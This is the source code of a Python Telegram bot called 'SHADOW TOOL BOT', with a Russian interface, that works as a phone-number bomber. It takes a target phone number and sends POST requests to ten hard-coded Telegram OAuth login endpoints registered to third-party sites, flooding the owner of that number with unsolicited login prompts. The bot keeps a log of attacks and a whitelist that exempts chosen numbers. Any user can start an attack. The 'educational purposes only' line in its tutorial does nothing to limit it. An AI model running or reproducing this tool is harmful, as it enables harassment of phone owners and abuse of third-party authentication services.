import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardMarkup, InlineKeyboardButton
import requests
import time
import json
import os
from datetime import datetime

BOT_TOKEN = "BOT_TOKEN"
ADMIN_ID = "ADMIN_ID"

bot = telebot.TeleBot(BOT_TOKEN)

WHITELIST_FILE = 'whitelist.json'
HISTORY_FILE = 'attack_history.json'

ATTACK_URLS = [
    'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1',
    'https://translations.telegram.org/auth/request',
    'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz',
    'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1',
    'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1'
]

def load_whitelist():
    if os.path.exists(WHITELIST_FILE):
        try:
            with open(WHITELIST_FILE, 'r') as f:
                return json.load(f)
        except:
            return []
    return []

def save_whitelist(wl):
    try:
        with open(WHITELIST_FILE, 'w') as f:
            json.dump(wl, f, indent=2)
        return True
    except:
        return False

def load_history():
    if os.path.exists(HISTORY_FILE):
        try:
            with open(HISTORY_FILE, 'r') as f:
                return json.load(f)
        except:
            return []
    return []

def save_history(history):
    try:
        with open(HISTORY_FILE, 'w') as f:
            json.dump(history, f, indent=2)
        return True
    except:
        return False

whitelist = load_whitelist()
attack_history = load_history()

def normalize_phone(phone):
    clean = ''.join(filter(str.isdigit, phone))
    if clean.startswith('8'):
        clean = '7' + clean[1:]
    if len(clean) == 10:
        clean = '7' + clean
    if not clean.startswith('+'):
        clean = '+' + clean
    return clean

def mask_phone(phone):
    if len(phone) <= 4:
        return phone
    visible = phone[-4:]
    masked = '*' * (len(phone) - 4)
    return masked + visible

def is_admin(user_id):
    return user_id == ADMIN_ID

def format_duration(ms):
    if ms < 1000:
        return f"{ms}мс"
    return f"{ms/1000:.2f}с"

def get_main_menu(user_id):
    markup = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    
    if is_admin(user_id):
        markup.add(KeyboardButton("🚀 АТАКА"))
        markup.add(KeyboardButton("📖 ТУТОРИАЛ"))
        markup.add(KeyboardButton("📜 ИСТОРИЯ"))
        markup.add(KeyboardButton("📋 БЕЛЫЙ СПИСОК"))
        markup.add(KeyboardButton("➕ ДОБАВИТЬ"))
        markup.add(KeyboardButton("❌ УДАЛИТЬ"))
    else:
        markup.add(KeyboardButton("🚀 АТАКА"))
        markup.add(KeyboardButton("📖 ТУТОРИАЛ"))
        markup.add(KeyboardButton("📜 ИСТОРИЯ"))
    
    return markup

def send_tutorial(message):
    markup = InlineKeyboardMarkup()
    markup.add(InlineKeyboardButton("🎥 СМОТРЕТЬ ТУТОРИАЛ", url="https://t.me/+NwCPobX0k2o1Njky"))
    markup.add(InlineKeyboardButton("📢 ПОДПИСАТЬСЯ НА КАНАЛ", url="https://t.me/fallsfack"))
    
    tutorial_text = """
📖 *ТУТОРИАЛ ПО ИСПОЛЬЗОВАНИЮ*

*ШАГ 1:* Нажми кнопку 🚀 АТАКА
*ШАГ 2:* Введи номер телефона (пример: +79001234567)
*ШАГ 3:* Бот отправит 10 запросов и покажет результат

*⚠️ ВНИМАНИЕ*
Инструмент предназначен только для образовательных целей!
Используйте только на своих ресурсах.

👑 По вопросам: @fallsfack
"""
    bot.send_message(message.chat.id, tutorial_text, parse_mode='Markdown', reply_markup=markup)

def send_history(message):
    global attack_history
    attack_history = load_history()
    
    if not attack_history:
        bot.send_message(message.chat.id, "📜 История атак пуста", reply_markup=get_main_menu(message.from_user.id))
        return
    
    total = len(attack_history)
    successful = sum(1 for a in attack_history if a.get('status') == 'success')
    failed = total - successful
    success_rate = int((successful / total) * 100) if total > 0 else 0
    
    stats_text = f"""
📊 *СТАТИСТИКА*
┌─────────────────┐
│ Всего атак: {total}
│ Успешных: {successful}
│ Неудачных: {failed}
│ Успешность: {success_rate}%
└─────────────────┘
"""
    
    last_attacks = attack_history[-5:] if len(attack_history) > 5 else attack_history
    history_text = "\n📜 *ПОСЛЕДНИЕ 5 АТАК:*\n"
    for a in reversed(last_attacks):
        status_icon = "✅" if a.get('status') == 'success' else "❌"
        history_text += f"{status_icon} {a.get('phone')} | {a.get('sent')}/{a.get('total')} | {a.get('time')}\n"
    
    bot.send_message(message.chat.id, stats_text + history_text, parse_mode='Markdown', reply_markup=get_main_menu(message.from_user.id))

def add_to_history(phone, sent, total, status, duration):
    global attack_history
    attack_history.append({
        'phone': mask_phone(phone),
        'sent': sent,
        'total': total,
        'status': status,
        'time': datetime.now().strftime('%H:%M:%S'),
        'date': datetime.now().strftime('%Y-%m-%d')
    })
    if len(attack_history) > 100:
        attack_history = attack_history[-100:]
    save_history(attack_history)

def send_whitelist(message):
    global whitelist
    whitelist = load_whitelist()
    if whitelist:
        phones = '\n'.join(whitelist)
        bot.send_message(message.chat.id, f"📋 БЕЛЫЙ СПИСОК:\n{phones}", reply_markup=get_main_menu(message.from_user.id))
    else:
        bot.send_message(message.chat.id, "📋 Белый список пуст", reply_markup=get_main_menu(message.from_user.id))

def add_to_whitelist(message, phone):
    global whitelist
    normalized = normalize_phone(phone)
    if normalized not in whitelist:
        whitelist.append(normalized)
        save_whitelist(whitelist)
        bot.send_message(message.chat.id, f"✅ {normalized} добавлен в белый список!", reply_markup=get_main_menu(message.from_user.id))
    else:
        bot.send_message(message.chat.id, f"⚠️ {normalized} уже в списке", reply_markup=get_main_menu(message.from_user.id))

def remove_from_whitelist(message, phone):
    global whitelist
    normalized = normalize_phone(phone)
    if normalized in whitelist:
        whitelist.remove(normalized)
        save_whitelist(whitelist)
        bot.send_message(message.chat.id, f"✅ {normalized} удалён из белого списка!", reply_markup=get_main_menu(message.from_user.id))
    else:
        bot.send_message(message.chat.id, f"⚠️ {normalized} не найден", reply_markup=get_main_menu(message.from_user.id))

def start_attack(message, phone):
    user_id = message.from_user.id
    normalized = normalize_phone(phone)
    
    current_whitelist = load_whitelist()
    if normalized in current_whitelist:
        bot.send_message(message.chat.id, f"⛔ АТАКА ОТМЕНЕНА!\nНомер {normalized} в белом списке!", reply_markup=get_main_menu(user_id))
        add_to_history(normalized, 0, len(ATTACK_URLS), 'blocked', 0)
        return
    
    msg = bot.send_message(message.chat.id, f"🔥 АТАКА НА {normalized}...\n0/{len(ATTACK_URLS)}")
    
    start_time = int(time.time() * 1000)
    sent = 0
    
    for i, url in enumerate(ATTACK_URLS):
        try:
            requests.post(url, data={'phone': normalized}, timeout=5)
            sent += 1
        except:
            sent += 1
        bot.edit_message_text(f"🔥 АТАКА НА {normalized}...\n{sent}/{len(ATTACK_URLS)}", message.chat.id, msg.message_id)
        time.sleep(0.3)
    
    end_time = int(time.time() * 1000)
    duration = end_time - start_time
    
    bot.edit_message_text(f"🎯 АТАКА ЗАВЕРШЕНА!\nОтправлено: {sent}/{len(ATTACK_URLS)}\nНомер: {normalized}\n⏱️ {format_duration(duration)}", message.chat.id, msg.message_id)
    bot.send_message(message.chat.id, "✅ Готово!", reply_markup=get_main_menu(user_id))
    
    add_to_history(normalized, sent, len(ATTACK_URLS), 'success', duration)

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(
        message.chat.id,
        "🔮 SHADOW TOOL BOT 🔮\n\n"
        f"👑 {'АДМИН' if is_admin(message.from_user.id) else 'ПОЛЬЗОВАТЕЛЬ'}\n\n"
        "👇 Нажми кнопку АТАКА",
        reply_markup=get_main_menu(message.from_user.id)
    )

@bot.message_handler(func=lambda message: True)
def handle_buttons(message):
    user_id = message.from_user.id
    text = message.text
    
    if text == "🚀 АТАКА":
        bot.send_message(message.chat.id, "📞 Введи номер:\nПример: +79001234567")
        bot.register_next_step_handler(message, lambda m: start_attack(m, m.text.strip()))
    
    elif text == "📖 ТУТОРИАЛ":
        send_tutorial(message)
    
    elif text == "📜 ИСТОРИЯ":
        send_history(message)
    
    elif text == "📋 БЕЛЫЙ СПИСОК" and is_admin(user_id):
        send_whitelist(message)
    
    elif text == "➕ ДОБАВИТЬ" and is_admin(user_id):
        bot.send_message(message.chat.id, "📝 Введи номер для добавления:")
        bot.register_next_step_handler(message, lambda m: add_to_whitelist(m, m.text.strip()))
    
    elif text == "❌ УДАЛИТЬ" and is_admin(user_id):
        bot.send_message(message.chat.id, "📝 Введи номер для удаления:")
        bot.register_next_step_handler(message, lambda m: remove_from_whitelist(m, m.text.strip()))
    
    else:
        if not is_admin(user_id) and text in ["📋 БЕЛЫЙ СПИСОК", "➕ ДОБАВИТЬ", "❌ УДАЛИТЬ"]:
            bot.send_message(message.chat.id, "⛔ Доступ запрещён!", reply_markup=get_main_menu(user_id))

@bot.message_handler(commands=['a'])
def attack_short(message):
    try:
        phone = message.text.split()[1]
        start_attack(message, phone)
    except IndexError:
        bot.reply_to(message, "❌ Используй: /a +79001234567")

print("🤖 Бот запущен!")
print(f"👑 Админ ID: {ADMIN_ID}")
bot.infinity_polling()
